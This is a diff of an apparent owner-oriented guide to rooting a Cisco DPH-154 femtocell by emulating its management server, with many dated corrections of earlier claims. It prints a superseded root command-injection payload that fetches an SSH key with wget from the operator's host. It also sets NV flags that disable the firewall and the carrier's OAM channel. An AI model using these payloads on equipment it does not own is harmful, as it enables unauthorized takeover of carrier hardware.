@@ -1,5 +1,16 @@
 # Bring-up: Cisco DPH-154 — the provider-emulation route, and the one bit that stops it
 
+> ## 🔑 **THIS PAGE ASSUMES THE DEVICE IS YOURS. THAT IS NOT A DISCLAIMER — IT IS THE SUBJECT.**
+> **Everything here is written for someone holding hardware they bought, pointing it at a core
+> they run.** ⭐ **That is not packaging around the technical content; it is what the technical
+> content is *for*.** A guide to reusing your own device and a guide to attacking someone else's
+> are different documents even where a paragraph would look the same.
+> ⛔ **Nothing here is for equipment or a network you do not own** — not a carrier's, not a
+> neighbour's, not one you found. **No route on this page is published to help you reach
+> somebody else's unit**, and every one of them needs physical or LAN access you would only
+> have to your own.
+> 📌 **What you may publish, what you may not, and the one bright line: [`LEGAL.md`](LEGAL.md).**
+
 > ## 1️⃣ **BEFORE STEP ONE — CONFIRM WHICH UNIT YOU ARE HOLDING: [`MATRIX.md`](MATRIX.md)**
 > **This guide is for the DPH-154: **no config banks at all** · **579** train · ⛔ JP: DO NOT OPEN IT**
 > ⇒ ⛔ **If your unit is not that, STOP — the other models differ in ways that have cost this
@@ -171,6 +182,43 @@ everything else here is.** 📌 **Y2K-dated leaf certificates are what worked; s
 ⛔ **That is NOT root, and it is NOT persistent** — it lasts exactly as long as you keep standing
 where AT&T stood. ⇒ **Phase 2 is what converts a session into a shell.**
 
+> ### ☠️☠️☠️ **AND BUDGET FOR THIS: EVERY UNIT THAT HAS EVER WORKED HERE INFORMED FOR *ONE DAY* AND THEN DIALLED FOREVER IN SILENCE.**
+> `[measured across three units on one ACS. Counted from the ACS's own logs.]`
+> ```
+> unit B   09-05        392 dials / 92 Informs  (23.5%)
+> unit B   09-06->09-17 477 dials / 0  Informs  (0%)      <- TWELVE DAYS, NOT ONE INFORM
+> unit C   09-11        its only Informing day
+> unit A   never Informed at all
+> ```
+> ⇒ ⭐⭐⭐ **THE DEVICE KEEPS DIALLING. It completes TLS, presents its client certificate, ACKs your
+> Finished — and then FINs with ZERO APPLICATION BYTES.** **It is not unreachable, not misrouted,
+> not refusing your certificate. It connects perfectly and says nothing.**
+> ### ⛔ **THIS KILLS THE PER-DEVICE EXPLANATION, WHICH IS THE ONE EVERYONE REACHES FOR FIRST**
+> **Three units, three different firmware trains, and the SAME one-day shape.** ⇒ **"that unit is
+> faulty" / "that build is different" / "that one's certificate is wrong" cannot account for a
+> pattern all three share.** ⚠️ **Plan Phase 3 around a management window that may close and not
+> reopen — get what you need in the first day.**
+> ### 📕 **RULED OUT, SO NOBODY SPENDS A NIGHT ON THEM**
+> ```
+> "serve it a different certificate"   ⛔ CLOSED, n=2 on the same intervention. A cert the unit
+>                                         PROVABLY accepts on its other management leg was served
+>                                         on the ACS leg; it FINed with zero bytes anyway, twice.
+> "our rejected SetParameterValues     ⛔ CLOSED. The last Informing session of the unit that went
+>  broke it"                              quiet contains NO ACS->CPE RPC AT ALL. Nothing was sent
+>                                         to it to have broken it.
+> "the clock is wrong, so the Y2K      ⛔ CLOSED. A unit's own report carries a CORRECT wall-clock
+>  certificate reads as not-yet-valid"    time.
+> ```
+> ⭐⭐ **The shape that survives all three: a post-handshake, LOCAL, SILENT decision on the device,
+> in single-digit milliseconds, with no network fetch.** **That is the revocation / trust-store
+> shape — reached from the wire, independently of any code reading.**
+> ⛔ **BOUND, AND IT IS LOAD-BEARING FOR EVERYTHING ABOVE:** the ACS log records *dialled → TLS-OK →
+> peer closed* and **nothing between — no byte count, no request line.** ⇒ ***"it sends zero
+> application bytes" is an INFERENCE FROM AN ABSENT LOG LINE.*** **Three states log identically:**
+> **(a) it sent nothing · (b) it sent HTTP we could not parse · (c) headers, then closed pre-body.**
+> ⇒ ✅ **A packet capture of that leg discriminates them and needs no code change. Until someone
+> runs one, what is established is only *"we never logged anything it said."***
+
 > ### ⚠️ **THE CWMP STORE AND THE NV ENVIRONMENT ARE DIFFERENT PLACES, AND CONFUSING THEM COSTS A DAY**
 > ```
 > our ACS writes  ->  the CWMP store only   (/var/ipaccess/cisco/dslg_cur_cfg.xml.gz)
@@ -183,16 +231,99 @@ where AT&T stood. ⇒ **Phase 2 is what converts a session into a shell.**
 
 ---
 
-## Phase 2 — ⭐⭐ The lever: `X_00000C_LogUpload.Tuning`, which writes straight into `nv_env.sh`
+## Phase 2 — `X_00000C_LogUpload.Tuning`: the right FIELD, and an UNPROVEN second half
 
-> ### 🔴 **THIS PAGE HAS NAMED THE WRONG ROUTE THREE TIMES. THE TRAIL IS KEPT BECAUSE EACH WRONG VERSION IS ONE SOMEONE ELSE WILL REACH FOR.**
+> ### 🔴🔴 **CORRECTED 2026-09-17 — `ENV_XKINIT` IS NOT A REAL KEY. THE DEVICE REJECTS IT, AND THAT WAS THE MOST QUOTABLE LINE ON THIS PAGE.**
+> `[measured from the device's OWN response, 2026-09-11T15:55:21, in the ACS body log on the core.]`
+> ```
+> soap:Fault 9003 Invalid arguments
+>   SetParameterValuesFault -> Device.X_00000C_LogUpload.Tuning
+>   9007 "Invalid parameter value: The invalid value is 'ENV_XKINIT: $(grep -q dph151-jp ...'"
+> ```
+> ⇒ ⛔ **THE FIRMWARE VALIDATES KEY NAMES.** `ENV_XKINIT` was **invented by this project**, and the
+> page's claim that *"the NAME is arbitrary — nothing consumes `ENV_XKINIT`"* is **exactly backwards**:
+> nothing consumes it **because the device will not store it.**
+> ### ✅ **THE SIX KEYS THE DEVICE ACTUALLY ACCEPTS** `[its own GetParameterValuesResponse, same session]`
+> ```
+> ENV_FIREWALL_DISABLED        TRUE      <- already TRUE ⇒ AN EARLIER Tuning SPV SUCCEEDED
+> ENV_VERBOSE_CONSOLE_ENABLED  TRUE      <- also already set
+> ENV_BASICOAM_DISABLED        TRUE
+> ENV_SERIAL_CONSOLE_ENABLED   FALSE
+> ENV_CRASH_REPORT_URL         (empty)   <- ★ the only URL-shaped field. The plausible escape sink.
+> ENV_DIAG_FILE_LIST           /var/ipaccess/.tamperInfo .../nv_env.sh ...
+> ```
+> ⭐⭐ **THOSE TWO `TRUE`s ARE THE STRONGEST RESULT ON THIS PAGE AND THEY ARE NOT THE ONE IT CLAIMED.**
+> **They are not defaults — something set them.** ⇒ **A `Tuning` SPV IS ACCEPTED AND IS STORED.**
+> **That half is PROVEN. The half that carries the page — that a stored value reaches `nv_env.sh`
+> and that `$( )` ever executes — IS NOT.**
+
+> ### ⛔ **AND ON THE 579.11.127 TRAIN THE DOCUMENTED CHAIN DOES NOT RESOLVE AT ALL**
+> `[lucid-fsvariant, read-only on a NAND dump of train 579.11.127, with controls stated below.]`
+> ```
+>                 setnv   nv_env   CONTROL '/opt'
+> DslmSsp           0       0          8      <- CONTROL PASSES ⇒ THE ZERO IS A MEASUREMENT
+> swdl_client       1       6          9      <- the sink's ACTUAL caller
+> cmhs              0       0          0      <- ⚠️ CONTROL FAILS ⇒ these zeros are INADMISSIBLE
+> sysctrlUpdateEnvVar:  0 files in the ENTIRE rootfs
+> ```
+> ⇒ 🔴 **`Tuning` → `DslmSsp` → `sysctrlUpdateEnvVar` → `setnv_env.sh` HAS NO `DslmSsp` HALF.**
+> ### ✅ **AND IT IS WRONG ON *BOTH* TRAINS — SO IT WAS NEVER A VERSION REGRESSION**
+> ~~*"It may be a 579.11.144 property — this page was written against a unit running .144."*~~
+> **That hedge was written here on 2026-09-17 and refuted the same day.** `[0 hits for
+> `setnv` / `nv_env` / `env.sh` / `sysctrlUpdateEnvVar` in **579.11.127 AND 579.11.144**, controls
+> passing. `ENV_XKINIT` returns **zero hits image-wide.**]`
+> ⇒ ⭐⭐⭐ **THE ROUTE WAS NEVER RIGHT ON ANY BUILD THIS PROJECT HAS TOUCHED.** **"Newer firmware
+> removed it" was the comfortable reading and it is false** — there is no build in which it worked.
+> ⭐ **A version hedge is the most attractive explanation available for a negative result, because it
+> preserves the original claim as once-true.** ⇒ **Check the OTHER version before reaching for it.**
+> ⛔ **BOUND, CARRIED VERBATIM FROM ITS AUTHOR:** *"a binary can call a script through a CONSTRUCTED
+> string, so 'the literal is absent' is NOT 'it cannot call it.'"* **What makes the zero admissible
+> is not the grep** — it is the complete command surface (35 strings, all printed), every path
+> fragment against a `swdl_client` control reading non-zero on all of them, and all 7 path-shaped
+> `%s` formats, **none of which builds under `/opt` or `/var`.**
+> ### ⚠️ **DEVICE-ATTRIBUTION BOUND — THIS SITS UNDER THE NEGATIVE RESULT ABOVE, SO READ IT WITH IT**
+> **The dump is a THIRD DEVICE** — its `hw_description.dat` serial matches neither unit discussed on
+> this page. **Its author's phrasing, carried verbatim:** *"train 579.11.127 as shipped on a DONOR
+> unit — applicability unverified."*
+> ⇒ **Its results reach a running `579.11.127` unit by TRAIN EQUALITY, which is an INFERENCE** — not
+> the byte-for-byte identity an earlier write-up claimed (*"THAT DUMP IS `.150`'s EXACT FILESYSTEM"*,
+> **now struck by its own author**).
+> 📌 **What is NOT in doubt: the running unit's own variant and train**, `282F` / `579.11.127`,
+> **read from the DEVICE's own management report — never from the dump.**
+
+> ### ✅ **AND A BRICK FEAR THAT A READER WILL OTHERWISE INFER FROM THIS PAGE — IT IS DEAD**
+> **`setnv_env.sh:46` uses `$VARNAME` unquoted as a `sed` regex**, which looks like a malformed key
+> could corrupt `nv_env.sh` and leave the unit unable to boot cleanly. ⇒ ⛔ **It cannot have
+> happened here: NEITHER TRAIN HAS ANY ROUTE TO `setnv_env.sh` AT ALL.** **The rejected SPV never
+> reached it, because nothing does.**
+> ⭐ **Recorded because the inference is the natural one** — a rejected write, a device that later
+> went quiet, and an unquoted regex sitting in the sink. **Three true facts that assemble into a
+> false story.** ⚠️ **And the quieting has its own within-device control: the same unit was equally
+> absent for six days earlier in the month, with no SPV anywhere near it, and came back on its own.**
+> ⇒ ***Do not read "it stopped answering" as "we broke it."***
+
+> ### ✅ **WHAT IS STILL TRUE, AND IT IS THE HALF WORTH KEEPING: THE SINK IS REAL**
+> ```
+> /etc/profile:66-70   NVENV=/var/ipaccess/nv_env.sh ; if [ -f $NVENV ]; then source $NVENV; fi
+> setnv_env.sh:46      echo "export $1=\"$2\"" >> $NVENV      ⭐ NO ESCAPING. $2 GOES IN VERBATIM.
+> ```
+> ⇒ **A value carrying `$( )` that reaches that file IS executed as root at the next login.** ⛔ **The
+> unproven link is everything UPSTREAM of it: what puts an attacker-chosen string into that file.**
+> ⭐ **`swdl_client` is the one binary that reaches the sink** — so on this train the road to
+> `nv_env` looks like the **software-download** path, not the CWMP parameter. ⚠️ **Which needs a
+> management session to trigger, and CWMP is the dead channel.**
+
+> ### 📕 **THE SUPERSEDED ROUTE-NAMING TRAIL, KEPT BECAUSE EACH WRONG VERSION IS ONE SOMEONE WILL REACH FOR**
 > ```
 > v1  "serve a firmware image; FS_VARIANT unhardens it"   NEVER DONE -- and it rewrites both U-Boot banks
 > v2  "rewrite ManagementServer.URL to point at you"      wrong mechanism: a pointer, not an injection
 > v3  "crlServerBaseUrl (2203)"                           RIGHT SINK, WRONG FIELD -- that is the 151's
 >                                                          DMI attribute. The 154 has no DMI console.
-> ✅  X_00000C_LogUpload.Tuning, over CWMP                 <- the field. JP called it "the serverurlpath thingy".
+> v4  "Tuning + ENV_XKINIT, over CWMP"                    RIGHT FIELD, REJECTED KEY -- fault 9003/9007
 > ```
+> ⭐⭐ **v1 has since come back as a MEASURED route and is no longer merely wrong** — see the
+> dev-letter branch under the full-image section at the end of this page. **It is still the
+> irreversible one, and still JP's decision rather than a lane's.**
 
 **The device dials OUT to your ACS.** ⭐⭐⭐ **That single fact is why this route works on a 154 and
 nothing else does:** the session is an **ESTABLISHED flow**, so the 154's wholesale inbound REJECT —
@@ -201,42 +332,62 @@ the thing that closes every other door — **is irrelevant to it.**
 ### 🔧 **THE CHAIN, EACH LINK NAMED**
 
 ```
-device DIALS OUT (CWMP)
-  ACS answers with SetParameterValues on   Device.X_00000C_LogUpload.Tuning
-     -> DslmSsp
-     -> sysctrlUpdateEnvVar
-     -> setnv_env.sh:46      echo "export $1=\"$2\"" >> nv_env.sh     ⭐ NO ESCAPING. THE WHOLE BUG.
-  => /var/ipaccess/nv_env.sh gains:    export ENV_XKINIT="$(<command>)"
-  => the next time ANY of its 22 ROOT CONSUMERS sources that file, the $( ) RUNS AS ROOT
+device DIALS OUT (CWMP)                                              ✅ PROVEN
+  ACS answers with SetParameterValues on Device.X_00000C_LogUpload.Tuning
+     -> the device ACCEPTS and STORES the value                      ✅ PROVEN
+        (two NV flags read TRUE that are not defaults)
+     -> ??? ------------------------------------------------------- 🔴 NOT ESTABLISHED
+        `DslmSsp` -> `sysctrlUpdateEnvVar` was the documented link.
+        `sysctrlUpdateEnvVar` DOES NOT EXIST on the 579.11.127 train,
+        and `DslmSsp` reaches neither `setnv_env` nor `nv_env`
+        (control passing). `swdl_client` is the only binary that does.
+     -> setnv_env.sh:46   echo "export $1=\"$2\"" >> nv_env.sh       ✅ SINK IS REAL, UNESCAPED
+  => the next time ANY root consumer sources that file, a $( ) in it RUNS AS ROOT   ✅ MECHANISM REAL
 ```
+⇒ ⭐⭐⭐ **THE MIDDLE ARROW IS THE WHOLE QUESTION, AND THIS PAGE USED TO DRAW IT SOLID.** Both ends
+are measured; **nothing measured joins them.** ⛔ **A chain diagram is the single most quotable
+artefact in a guide, and every link in it reads as equally established.** ⇒ **Mark the unproven
+link INSIDE the diagram, never in a note beneath it.**
 
 > ### 🎯 **AND `/etc/profile:69` SOURCES IT — SO A LOGIN IS ENOUGH**
 > **No reboot. No service restart.** ⭐ **Compare the 151, where the equivalent needs TWO reboots** —
 > the subshell cannot change the parent environment, so the flag must be written to the file and the
 > box booted again. **Here, anything that opens a shell fires it.**
 
-### 🎯 **THE ACTUAL WRITE, AS IT WAS SENT — FOUR VARIABLES IN ONE SPV**
+### 🎯 **THE WRITE THAT WORKS — AND IT IS THE THREE FLAGS, NOT AN INJECTION**
 
+**Send only keys the firmware accepts.** These three are measured as accepted and stored:
 ```
 Device.X_00000C_LogUpload.Tuning  =
-  "ENV_XKINIT: $(mkdir -p /var/ipaccess/root_home/.ssh && wget -q -O- http://<you>:8081/k
-                 >>/var/ipaccess/root_home/.ssh/authorized_keys);
-   ENV_FIREWALL_DISABLED:        TRUE;
+  "ENV_FIREWALL_DISABLED:        TRUE;
    ENV_VERBOSE_CONSOLE_ENABLED:  TRUE;
    ENV_BASICOAM_DISABLED:        TRUE;"
 ```
-⇒ ⭐⭐⭐ **THIS is why `Tuning` and not a URL-shaped attribute: you choose the variable NAMES, so the
-injection AND the three flags that make it useful land in a SINGLE write.**
 ```
-ENV_XKINIT                    the injection. The $( ) runs as root when nv_env.sh is sourced.
-                              ⭐ the NAME is arbitrary — nothing consumes ENV_XKINIT. It exists
-                                 only to carry the substitution.
 ENV_FIREWALL_DISABLED  TRUE   so you can reach the port afterwards
 ENV_VERBOSE_CONSOLE_…  TRUE   so dropbear binds 0.0.0.0:22 instead of loopback
 ENV_BASICOAM_DISABLED  TRUE   ⬅ stops the unit's Basic-OAM channel phoning its real operator
 ```
-⚠️ **The payload pulls the key from your own HTTP server (`:8081` here) rather than embedding it** —
-**one less quoting layer inside a string that is already being interpolated into a shell file.**
+⇒ ✅ **That is a real, useful configuration win and it needs no injection at all.** ⚠️ **It does
+not by itself give you a shell** — it opens the path to one you obtain another way.
+
+> ### 📕 **SUPERSEDED, KEPT VERBATIM — THE PAYLOAD AS THIS PAGE USED TO GIVE IT. IT IS REJECTED.**
+> ```
+> ~~Device.X_00000C_LogUpload.Tuning =~~
+> ~~  "ENV_XKINIT: $(mkdir -p /var/ipaccess/root_home/.ssh && wget -q -O- http://<you>:8081/k~~
+> ~~                 >>/var/ipaccess/root_home/.ssh/authorized_keys); ..."~~
+> ~~⇒ "the NAME is arbitrary — nothing consumes ENV_XKINIT"~~
+> ```
+> 🔴 **`soap:Fault 9003 / 9007 Invalid parameter value`. The device names `ENV_XKINIT` in its own
+> rejection.** ⇒ **Anyone who copies the struck block gets a fault and no shell.**
+> ⭐⭐ **AND THE SENTENCE THAT MADE IT LOOK SAFE IS THE ONE THAT WAS WRONG.** *"The name is
+> arbitrary"* was offered as reassurance — a throwaway clause, the kind nobody re-checks — and it
+> was the **load-bearing false premise of the whole route.** ⇒ ***The claim most worth verifying is
+> the one presented as too obvious to need it.***
+> ⚠️ **A URL-shaped field survives as the remaining candidate sink: `ENV_CRASH_REPORT_URL` is
+> accepted, is currently empty, and is the only one of the six that takes a URL.** ⛔ **Nobody has
+> tested whether a `$( )` in it reaches `nv_env.sh` — and the chain above says the upstream half is
+> missing on at least one train. UNMEASURED. Do not price it as a route.**
 
 > ### ⛔⛔ **`Tuning` IS A WHOLE-STRING REPLACE, AND THE REAL WRITE HAD TO CARRY SIX PRE-EXISTING KEYS**
 > **The device's live `Tuning` value already held keys. Sending only your own would have DELETED
@@ -261,6 +412,23 @@ ENV_DIAG_FILE_LIST: /var/ipaccess/.tamperInfo /var/ipaccess/nv_env.sh …
 > omission; a STALE key looks like diligence — present, correctly spelled, and wrong.**
 
 > ### ⛔⛔ **THE HONEST STATE OF THE ESCAPE — AND THE PAYLOAD IS IN THE TOOL, DATED AND ATTRIBUTED**
+> ### 🔴 **READ THE PHASE 2 BANNER FIRST: THE KEY IN THE PAYLOAD BELOW IS ONE THE DEVICE REJECTS.**
+> **The ✅ on *"the payload EXISTS"* means it exists IN THE TOOL — not that it worked.** ⭐ **A green
+> check on a true statement, sitting one line above a payload, is read as a green check on the
+> payload.**
+> ### ⚠️ **AND A TENSION THIS PAGE MUST NOT RESOLVE BY PICKING A SIDE**
+> ```
+> JP, who ran it   "we were able to get into the 154 that way"      <- TESTIMONY
+> the device       fault 9003/9007, naming ENV_XKINIT in its own    <- MEASUREMENT
+>                  rejection; 0 of 663 readbacks contained the key
+> ```
+> ⇒ **Both are in this corpus and they do not agree.** ⛔ **Recorded, NOT adjudicated.** The
+> possibilities include different moments, different units, a different key name on the successful
+> attempt, or a route in by something other than this field. **Nobody has established which.**
+> ⭐⭐ **This corpus's own rule applies and is the reason the page does not simply believe the
+> operator: *testimony from the person holding the hardware has no evidence class here.*** ⚠️ **That
+> cuts BOTH ways — it does not make the testimony false, it makes it unciteable as proof.** ✅ **What
+> would settle it: the SPV body and the fault-or-success for the attempt JP is remembering.**
 > ```
 > ✅ the payload EXISTS, queued through this exact field, with its authorisation recorded in code:
 >       Tuning <- "ENV_XKINIT: $(mkdir -p /var/ipaccess/root_home/.ssh && <key install>)"
@@ -273,8 +441,20 @@ ENV_DIAG_FILE_LIST: /var/ipaccess/.tamperInfo /var/ipaccess/nv_env.sh …
 > authorised.** ⛔ **What is NOT settled is whether that particular queued write ever executed** —
 > the readback evidence says that one did not. ⚠️ **Recorded, not adjudicated: the likeliest reading
 > is different moments on different units, and nobody has established it.**
-> ✅ **Beyond doubt either way: the `Tuning` write lands, the NV variables it sets take effect, and
-> the field reaches `setnv_env.sh` unescaped.**
+> ### 🔴 **CORRECTED 2026-09-17 — THE "BEYOND DOUBT" LINE BELOW WAS WRONG IN ITS THIRD CLAUSE.**
+> ~~*"Beyond doubt either way: the `Tuning` write lands, the NV variables it sets take effect, and
+> the field reaches `setnv_env.sh` unescaped."*~~
+> ```
+> "the Tuning write lands"                    ✅ STANDS — measured, an SPV was accepted and stored
+> "the NV variables it sets take effect"      ✅ STANDS — two flags read TRUE that are not defaults
+> "the field reaches setnv_env.sh unescaped"  🔴 NOT ESTABLISHED — this is the missing middle arrow
+> ```
+> ⇒ ☠️ **Two measured clauses and one unmeasured one, joined by "and" under the words "beyond
+> doubt".** ⭐⭐ ***A conjunction inherits the confidence of its strongest member.*** The two true
+> clauses were doing the persuasive work for the third, and the phrase "beyond doubt either way"
+> made the whole sentence unre-checkable — **it reads as the place where the hedging STOPS.**
+> ⚠️ **`setnv_env.sh` IS unescaped — that part is measured and kept above.** What is missing is any
+> demonstrated path from the `Tuning` field TO `setnv_env.sh`.
 
 > ### ✅ **THE PRECONDITION IS MEASURED, AND IT IS WHY THIS SUITS A 154 AND NOT A 151**
 > ```
@@ -307,9 +487,16 @@ Route 6.** ⭐ **On a 154 the ACS is the console.**
 crlServerBaseUrl (2203, ac=1 WRITABLE)  ->  export ENV_CRL_BASE_SERVER="<your value>"
 ```
 ⇒ **Also unescaped, so it also injects.** ⛔ **But it writes ONE FIXED VARIABLE: you inject into the
-VALUE of a variable you did not choose.** ⭐ **`Tuning` takes `NAME: value; NAME: value` — you
-choose the variable NAME, which is why `ENV_XKINIT`, `ENV_FIREWALL_DISABLED` and
-`ENV_VERBOSE_CONSOLE_ENABLED` can all come from a single write.**
+VALUE of a variable you did not choose.** ⭐ **`Tuning` takes `NAME: value; NAME: value`, so several
+keys land in a single write** — `ENV_FIREWALL_DISABLED` and `ENV_VERBOSE_CONSOLE_ENABLED` together.
+> ### 🔴 **CORRECTED 2026-09-17 — "YOU CHOOSE THE VARIABLE NAME" IS FALSE ON THE 154.**
+> ~~*"you choose the variable NAME, which is why `ENV_XKINIT` … can all come from a single write"*~~
+> **The firmware validates key names and rejects anything outside its six** (fault 9003/9007 — see
+> the Phase 2 banner). ⇒ ⛔ **The advantage `Tuning` was said to have over `crlServerBaseUrl` — a
+> free choice of variable name — DOES NOT EXIST.** **Both fields let you control a VALUE only.**
+> ⭐⭐ **And that inverts the comparison this section was written to make:** `Tuning`'s edge over the
+> 2203 door is now **breadth (several known keys at once), not arbitrary naming.** ⚠️ **`2203` is a
+> nano3G DMI attribute and a 154 has no DMI console, so the comparison stays hypothetical here.**
 > ### ☠️ **AND IF YOU GO LOOKING FOR `2203`, THE ATTRIBUTE MAPS IN CIRCULATION DISAGREE BY ONE ROW**
 > ```
 > the STALE map       2201 crlServerBaseUrl  ·  2203 crls
@@ -415,6 +602,23 @@ be happily informing the ACS while failing CMHS entirely.
 session it opened to you.** **From here the software half of [`BRINGUP.md`](BRINGUP.md) Phases 4–8
 applies**: point it at your core, give it radio parameters, unlock, connect.
 
+> ### ⛔ **STOP. THIS IS THE STEP THAT PUTS A TRANSMITTER ON LICENSED SPECTRUM.**
+> Everything before this point was passive. **From here the cell radiates.**
+> **Band 2 (1900 PCS) and Band 5 (850 Cellular) are refarmed and in active use** — empty of the
+> old technology is not the same as vacant. There is a clean route (a **Part 5 experimental
+> licence** in the US) and there is minimum power with physical containment. **You cannot have
+> house-wide coverage and RF containment at the same time.**
+> **Settle the PLMN before this step, not after** — a unit that ran on a carrier still carries
+> that carrier's MCC/MNC. Use **999-99** or **001-01**, and verify it **on the air**.
+> 📌 Full text: the spectrum section of the [README](../README.md).
+> ### ☠️ **AND EMERGENCY CALLING DOES NOT WORK ON THIS CELL.**
+> A handset that camps onto it will try to place **911 / 112 / 999 calls through it, and they
+> will not complete** — with **no warning shown to the user.** It displays bars and looks like
+> service. ⛔ **Not fixable with configuration:** a private core has no route to emergency
+> services. ⇒ **Programmed SIMs you control, minimum power, physical containment** — so no
+> handset you do not control can camp on. ☠️ **If anyone nearby might rely on a phone to call
+> for help, do not run the cell.**
+
 ⛔ **Except on this unit it stops, and the next phase is why.**
 
 ---
@@ -456,6 +660,32 @@ and is not one.**
   U-Boot reads a 4-byte `default_bank` value, and `config_bank_1`/`config_bank_2` **do not exist on
   it at all.** ⇒ [`Trap 2`](TRAPS.md#2-which-config-bank-is-live-differs-per-model--and-guessing-kills-the-cell)
   does not apply to this model in the same form.
+
+> ### ✅ **ROUTES CLOSED BY MEASUREMENT — RECORDED SO NOBODY SPENDS A NIGHT REOPENING THEM**
+> **A guide that lists only open questions invites the same dead ends to be re-tried.** These three
+> are shut, each with the instrument that shut it:
+> ```
+> netannounce / udp 5050   CLOSED  bound on a DPH-151 (read from its SOCKET TABLE, not a scan),
+>                                  but a 154 has NO Ralink to send from, its iptables-282F ruleset
+>                                  has ZERO inbound-NEW ACCEPTs against 2 in every 205*/224*/234*
+>                                  set, and a 90 s passive capture saw 0 UDP from the unit
+>                                  ⇒ no conntrack window ever opens.
+> CMHS as a command channel CLOSED  the binary carries FOUR FIXED fully-qualified literals and
+>                                  ZERO format specifiers -- nothing interpolable. It can be
+>                                  spoken to; it cannot be made to carry an argument you choose.
+> a cert-chain swap         CLOSED  the alternative chain is a RE-SIGNATURE of the same identity:
+>                                  identical leaf public key, identical SKI, and its SAN is a
+>                                  strict SUPERSET. Nothing to gain -- confirmed independently
+>                                  rather than by trusting the deployed code's own comment.
+> ```
+> ⭐⭐ **`CMHS is inert` is the one worth internalising, because it is counter-intuitive:** CMHS is
+> the **only live management channel** on a unit whose CWMP is dead, so it reads like the obvious
+> way in. ⇒ ***Being the only channel left does not make it a channel that can carry a payload.***
+> ⚠️ **What is still OPEN on CMHS, and it is a different question: whether it can TRIGGER A DOWNLOAD
+> or SET A URL.** **Both software-download routes need something to hand them a URL, and CWMP — the
+> documented trigger — is the dead one.** ⇒ 🎯 **That is the real remaining question on this page.**
+> ⛔ **BOUND: one probe of CMHS's settable surface had a FAILING CONTROL, so its zeros are
+> inadmissible and are not quoted here.** **Unmeasured, not measured-negative.**
 
 ---
 
@@ -538,10 +768,24 @@ next section as instructions.**
 > | bank / bootloader write | ⭐ **NONE — a trailing `exit 0` returns from the sourced script and skips `post_swdl_hook`'s `delete_config` / `switching_bank` tail** | ⛔ **BOTH U-Boot banks rewritten** |
 > | reversible | ✅ **yes — "it never writes a firmware bank, so the active image stays verifiable"** | ⛔ **no** |
 > | status here | ✅ **the route that rooted a DPH-151** | ⚠️ **tested on the 154 by JP; did not work** |
+> | **the `FS_VARIANT` dev-letter branch** | ⛔ **NOT REACHABLE** | ✅ **this is where it lives** |
 >
 > ⇒ ⭐⭐⭐ **The irreversibility belongs to the IMAGE variant, not to "software download".** ⛔ **A
 > reader who learns *"software downloads rewrite bootloaders"* will avoid the cheap one too — which
 > is the one that actually worked on a sibling model.**
+> ### ⛔⛔ **AND THE MIRROR ERROR, WHICH IS THE ONE THIS TABLE NOW INVITES: YOU CANNOT GET THE DEV-LETTER BRANCH CHEAPLY.**
+> **`init_nv_env` is called from `swdl_client:1043/1054`, immediately after
+> `mount -o loop -t cramfs $1/images/fs.bin` — it reads `FS_VARIANT` out of a MOUNTED FILESYSTEM
+> IMAGE.** ⇒ **No filesystem, no branch.** ⛔ **A `0x5007` payload is a shell script; there is
+> nothing to loop-mount, so the dev-letter lever is unavailable on the free, reversible path.**
+> ⚠️ **Reading the two halves of this table separately — "`0x5007` is free and reversible" and "one
+> character turns the firewall off" — and combining them produces a route that does not exist.**
+> ⇒ ⭐ ***The dev-letter lever and the reversible download are in different columns, and that is the
+> whole point of the table.*** **The lever costs the dual-bank rewrite. That is JP's decision to
+> take, not a lane's.**
+> 📌 **And on a production unit the branch works AGAINST you every boot:** a variant letter outside
+> the eight makes the active-bank path **re-assert the production values on every run**. **The
+> firewall is switched on deliberately, by design, not left on by neglect.**
 > ### ✅ **WHY `0x5007` NEEDS NO SIGNATURE**
 > **Image signing is OFF on these builds (`verifyflash` disabled)** — the package needs only its
 > three internal CRCs and a well-formed header. ⇒ **That is the property the whole route rests on.**
@@ -574,12 +818,48 @@ CWMP Download -> swdl_client -> activate_bank -> activate_fs -> set_hardened_sta
 > ### 🎯 **THE LEVER IS NOT THE FILE WRITE. IT IS `FS_VARIANT`, AND IT COMES FROM THE IMAGE YOU SUPPLY.**
 > `set_hardened_state` loop-mounts the filesystem **you served** and reads `FS_VARIANT` out of its own
 > `/etc/sw_description.dat`. The hardening decision is then **a pure function of the 4th character**:
+> ### ✅ **THE LETTER SET MEANS *UNHARDENED*. THE VENDOR NAMES THE VARIABLE, SO THERE IS NOTHING TO INTERPRET.**
 > ```
-> rcS:48   FS_LETTER=$(echo $FS_VARIANT | cut -c4)   ->  DEFAULT_UNHARDENED
->          hardened only for:  A C E G I W X Z
+> rcS:83-93              FS_LETTER    = `echo $FS_VARIANT | cut -c4`
+>                        A C E G I W X Y Z  ->  DEFAULT_UNHARDENED="TRUE"
+>                                               ⬆ THE VENDOR'S OWN VARIABLE NAME
+>
+> swdl_client:1008-1028  ALTFSLETTER  = `echo $1 | cut -c4`
+>                        A C E G I W X   Z  ->  "Development release - enabling uboot and
+>                                                kernel consoles"
+>                                               ENV_FIREWALL_DISABLED        TRUE
+>                                               ENV_VERBOSE_CONSOLE_ENABLED  TRUE
+>                        else               ->  "Production release - disabling ..."
+>                                               ENV_FIREWALL_DISABLED        FALSE
 > ```
-> ⇒ ⭐ **You choose that character.** The unit hardens or unhardens *itself*, on your say-so, through
-> its own vendor code path.
+> ⇒ ⭐ **You choose that character.** **A letter IN the set = development = firewall OFF, consoles
+> ON. A letter OUTSIDE it = production = firewall ON.** The unit unhardens *itself*, on your say-so,
+> through its own vendor code path.
+> ### 🔴 **CORRECTED 2026-09-17 — THIS PAGE HAD THE POLARITY EXACTLY BACKWARDS**
+> ~~*"rcS:48 … hardened only for: A C E G I W X Z"*~~
+> ⛔ **A reader who trusted that line would serve a "hardened" image in order to HARDEN a unit and
+> get the FIREWALL TURNED OFF** — on the operation that rewrites both U-Boot banks.
+> ⭐⭐⭐ **THE FIX IS TO QUOTE THE NAME, NOT TO RESTATE THE RULE:** `DEFAULT_UNHARDENED="TRUE"` is
+> the vendor's own identifier, and ***a variable the vendor named cannot be re-inverted by a later
+> reader's interpretation.*** **Every paraphrase of a polarity is one inversion away from wrong;
+> the identifier is not.**
+> ### ✅ **THREE INDEPENDENT AGREEMENTS, WHICH IS WHY THIS IS SETTLED AND NOT MERELY RE-ARGUED**
+> ```
+> 1 CODE              rcS's variable is literally called DEFAULT_UNHARDENED
+> 2 VENDOR DEBUG STR  swdl_client prints "Development release" / "Production release"
+> 3 DEVICE BEHAVIOUR  a 579.11.127 unit reports 282F -- letter F, OUTSIDE both sets -> production
